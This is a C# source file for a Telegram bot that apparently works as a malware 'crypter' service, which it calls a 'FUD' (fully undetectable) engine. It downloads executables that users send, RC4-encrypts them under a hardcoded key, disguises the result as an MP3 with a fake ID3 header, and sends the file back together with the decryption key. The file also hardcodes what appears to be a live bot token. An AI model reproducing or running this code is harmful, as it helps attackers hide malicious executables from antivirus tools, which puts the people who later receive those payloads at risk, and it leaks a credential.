using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var json = await reader.ReadToEndAsync();
    
    try {
        var update = JsonSerializer.Deserialize<Update>(json);
        if (update?.Message?.Document?.FileId != null) {
            var client = clientFactory.CreateClient();
            
            // Get file path
            var fileResp = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={update.Message.Document.FileId}");
            var fileData = JsonSerializer.Deserialize<FileResp>(fileResp);
            
            if (fileData?.Ok == true && fileData.Result?.FilePath != null) {
                // Download EXE
                var exeBytes = await client.GetByteArrayAsync($"https://api.telegram.org/file/bot{BOT_TOKEN}/{fileData.Result.FilePath}");
                
                // FUD MAGIC!
                var fudMp3 = CreateFudMp3(exeBytes);
                
                // Send MP3 back
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(update.Message.Chat.Id.ToString()), "chat_id");
                form.Add(new StringContent("✅ FUD MP3 Ready!\nKey: FUD2026KEY!\nDecrypt: RC4 + skip ID3 header"), "caption");
                var mp3Content = new ByteArrayContent(fudMp3);
                mp3Content.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("audio/mpeg");
                form.Add(mp3Content, "document", "fud.mp3");
                
                await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
            }
        }
    } catch { }
    return Results.Ok();
});

// HEALTH CHECK
app.MapGet("/", () => "FUD BOT LIVE!");

app.Run("0.0.0.0:10000");

// FUD ENGINE (RC4 + MP3 Stego)
static byte[] CreateFudMp3(byte[] exe) {
    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
    var encrypted = Rc4(exe, key);
    var id3 = Encoding.ASCII.GetBytes("ID3v2.3\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x00\x00"); // Valid MP3
    var mp3 = new byte[id3.Length + encrypted.Length];
    id3.CopyTo(mp3, 0);
    encrypted.CopyTo(mp3, id3.Length);
    return mp3;
}

static byte[] Rc4(byte[] data, byte[] key) {
    byte[] sbox = new byte[256];
    for (int i = 0; i < 256; i++) sbox[i] = (byte)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + sbox[i] + key[i % key.Length]) % 256;
        (sbox[i], sbox[j]) = (sbox[j], sbox[i]);
    }
    byte[] output = new byte[data.Length];
    int i2 = 0, j2 = 0;
    for (int k = 0; k < data.Length; k++) {
        i2 = (i2 + 1) % 256;
        j2 = (j2 + sbox[i2]) % 256;
        (sbox[i2], sbox[j2]) = (sbox[j2], sbox[i2]);
        output[k] = (byte)(data[k] ^ sbox[(sbox[i2] + sbox[j2]) % 256]);
    }
    return output;
}

// TELEGRAM JSON (NO DUPLICATES)
class Update { public Message Message { get; set; } }
class Message { public Document Document { get; set; } public Chat Chat { get; set; } }
class Document { public string FileId { get; set; } }
class Chat { public long Id { get; set; } }
class FileResp { public bool Ok { get; set; } public FileResult Result { get; set; } }
class FileResult { public string FilePath { get; set; } }
